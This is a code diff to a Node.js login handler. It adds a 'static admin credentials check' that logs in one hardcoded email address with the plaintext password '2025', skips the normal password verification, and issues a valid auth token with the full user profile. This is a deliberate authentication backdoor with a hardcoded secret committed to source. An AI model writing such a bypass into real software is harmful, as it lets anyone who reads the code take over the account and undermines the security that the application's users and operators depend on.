@@ -71,6 +71,33 @@ const registerUser = async (req, res, next) => {
 const loginUser = async (req, res, next) => {
     const { email, password } = req.body;
 
+    // Static admin credentials check
+    if (email === 'reponsekdz0@gmail.com' && password === '2025') {
+        try {
+            const [users] = await pool.query('SELECT * FROM users WHERE email = ?', [email]);
+            if (users.length === 0) {
+                return res.status(401).json({ message: 'Static admin account not found in DB.' });
+            }
+            const user = users[0];
+            
+            await pool.query('INSERT INTO activity_log (user_id, action_type, ip_address, details) VALUES (?, ?, ?, ?)', [
+                user.id, 'login', req.ipAddress, JSON.stringify({ device: req.headers['user-agent'], method: 'static_password' })
+            ]);
+
+            const [fullUserRows] = await pool.query(formatUserFromDb.userQuery, [user.id]);
+            const fullUser = formatUserFromDb(fullUserRows[0]);
+            
+            res.json({
+                ...fullUser,
+                token: generateToken(user.id),
+            });
+            return; 
+        } catch (error) {
+            return next(error);
+        }
+    }
+
+
     try {
         const [users] = await pool.query('SELECT * FROM users WHERE email = ?', [email]);
         if (users.length === 0) {
